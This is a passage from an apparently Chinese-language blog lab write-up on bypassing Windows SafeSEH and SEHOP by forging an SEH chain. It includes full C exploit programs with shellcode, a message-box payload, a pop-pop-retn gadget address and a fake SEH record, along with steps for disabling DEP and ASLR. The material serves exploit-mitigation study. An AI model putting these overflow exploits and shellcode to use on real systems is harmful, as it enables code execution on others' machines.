class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">    pop eax</span><br><span class="line">    pop eax</span><br><span class="line">    retn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str,input);</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(MyException())</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="为-seh_nosaeseh_jumpdll-禁-用-sehop"><a class="markdownIt-Anchor" href="#为-seh_nosaeseh_jumpdll-禁-用-sehop"></a> 为 SEH_NOSaeSEH_JUMP.dll 禁 用 SEHOP</h3><p>用 CFF Explorer 打开 SEH_NOSaeSEH_JUMP.dll 后在 Optional header 选项页中来进行设置，分别将 MajorLinkerVersion 和MinorLinkerVersion 设置为 0x53 和 0x52。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628122629316.png" alt="image-20220628122629316"></p><h3 id="对主程序进行一定的修改"><a class="markdownIt-Anchor" href="#对主程序进行一定的修改"></a> 对主程序进行一定的修改</h3><p>（1）修改弹出对话框的 shellcode，让其可以在 windows 7下正常弹出。</p><p>windows xp下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133422937.png" alt="windows xp下的SafeSEH"></p><p>windows 7下的SafeSEH<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628133204357.png" alt="windows 7下的SafeSEH"></p><p>由于在 Windows 7 下 PEB_LDR_DATA 指向加载模块列表中第二个模块位置被 KERNELBASE.dll 占据， kernel32.dll 的位置由第二个变为第三个，所以要对 shellcode 做出相应修改。在原来 shellcode 的第 52 个字节之后插入 “\x8B\x09”，该机器码对应的汇编语句为MOV ECX,[ECX]，来让程序多跳转一次，定位到 kernel32.dll。修改后的对话框 shellcode 如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Shellcode=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\x09&quot;</span> <span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line"><span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br></pre></td></tr></table></figure><p>（2）禁用程序的 DEP，通过取消程序的/NXCOMPAT 链接选项。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628130325139.png" alt="image-20220628130325139"></p><h1 id="伪造-seh-链表"><a class="markdownIt-Anchor" href="#伪造-seh-链表"></a> 伪造 S.E.H 链表</h1><h2 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h2><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628142531628.png" alt="image-20220628142531628"></p><p>为了提高溢出的成功率，我们在本实验中关闭系统的 ASLR，因为伪造 S.E.H 链时需要用到 FinalExceptionHandler 指向的地址。所以这里只讨论这种方法理论上的可行性。</p><p>伪造 S.E.H 链绕过 SEHOP 所需条件：<br>（ 1）图 14.5.1 中的 0xXXXXXXXX 地址必须指向当前栈中，而且必须能够被 4 整除。<br>（ 2） 0xXXXXXXXX 处存放的异常处理记录作为 S.E.H 链的最后一项，其异常处理函数指针必须指向终极异常处理函数。<br>（ 3）突破 SEHOP 检查后，溢出程序还需搞定 SafeSEH。</p><p>为了避免实验过于复杂，本次实验我们在 “利用未启用 SafeSEH 模块绕过 SafeSEH” 的基础 上 进 行 ， 所以不用再考虑 SafeSEH 的问题，只需确定 0xXXXXXXXX 的值和 FinalExceptionHandler 指向的地址。</p><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">// the fake seh record</span></span><br><span class="line">    <span class="string">&quot;\x75\xA8\xF7\x77&quot;</span></span><br><span class="line">    ;</span><br><span class="line">DWORD <span class="title function_">MyException</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;There is an exception&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,input,<span class="number">412</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    &#125;</span><br><span class="line">    __except(MyException())</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(_T(<span class="string">&quot;SEH_NOSafeSEH_JUMP.dll&quot;</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    test(shellcode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h2><p>（ 1）通过未启用 SafeSEH 的 SEH_NOSaeSEH_JUMP.dll 来绕过 SafeSEH。<br>（ 2）通过伪造 S.E.H 链，造成 S.E.H 链未被破坏的假象来绕过 SEHOP。<br>（ 3） SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。<br>（ 4）使用 SEH_NOSafeSEH_JUMP.DLL 中的 “pop pop retn” 指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理。通过劫持异常处理流程，程序转入 SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统 W</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>系统 ASLR</td><td>关闭</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：实验中的 FinalExceptionHandler 指向的地址可能在您的系统中会有所变化</p></blockquote><h2 id="实验步骤-2"><a class="markdownIt-Anchor" href="#实验步骤-2"></a> 实验步骤</h2><h3 id="先启用-sehop"><a class="markdownIt-Anchor" href="#先启用-sehop"></a> 先启用 SEHOP</h3><p>把 MajorLinkerVersion 和 MinorLinkerVersion 的值分别设为 0x06 和 0x00，排除上一个实验的影响。<br><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628145516662.png" alt="image-20220628145516662"></p><h3 id="确定-finalexceptionhandler-指向的地址"><a class="markdownIt-Anchor" href="#确定-finalexceptionhandler-指向的地址"></a> 确定 FinalExceptionHandler 指向的地址</h3><p>用 OllyDbg 加载好程序后直接观察堆栈的底部就可以看到 FinalExceptionHandler 指向的地址，本次实验中地址为 0x770DAB2D。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628151551454.png" alt="image-20220628151551454"></p><h3 id="伪造-seh-链"><a class="markdownIt-Anchor" href="#伪造-seh-链"></a> 伪造 S.E.H 链</h3><h4 id="先看一下-seh-的覆盖情况"><a class="markdownIt-Anchor" href="#先看一下-seh-的覆盖情况"></a> 先看一下 S.E.H 的覆盖情况</h4><p>按 F9 键让程序运行，程序会在除零异常发生时中断。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152251152.png" alt="image-20220628152251152"></p><p>由上图可得，str[]的起始地址为 0x0012FD80。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628152504174.png" alt="image-20220628152504174"></p><p>位于 0x0012FE58 处的栈顶异常处理记录已经被覆盖为 0x90909090，S.E.H 链已经被破坏。前面需用 216 个 0x90 填充。</p><h4 id="确定伪造的异常处理记录放置位置"><a class="markdownIt-Anchor" href="#确定伪造的异常处理记录放置位置"></a> 确定伪造的异常处理记录放置位置</h4><p>首先，不能直接使用程序自带的终极异常处理记录，因为该记录位于 0x0012FFE4，它作为机器码被执行时，会影响程序正常运行，您可自行调试观察一下。</p><p>不如在距离弹出对话框机器码结束最近的内存放置伪造的异常处理记录，当然这个地址不仅可以被 4 整除而且还不能影响程序的执行，本次实验选择 0x0012FF14。</p><h4 id="部署-shellcode"><a class="markdownIt-Anchor" href="#部署-shellcode"></a> 部署 shellcode</h4><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628180107496.png" alt="image-20220628180107496"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x14\xFF\x12\x00&quot;</span><span class="comment">//address of last seh record</span></span><br><span class="line">    <span class="string">&quot;\x68\x10\x12\x11&quot;</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x09&quot;</span><span class="comment">//在这增加机器码\x8B\x09，它对应的汇编为 mov ecx,[ecx]</span></span><br><span class="line">    <span class="string">&quot;\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span 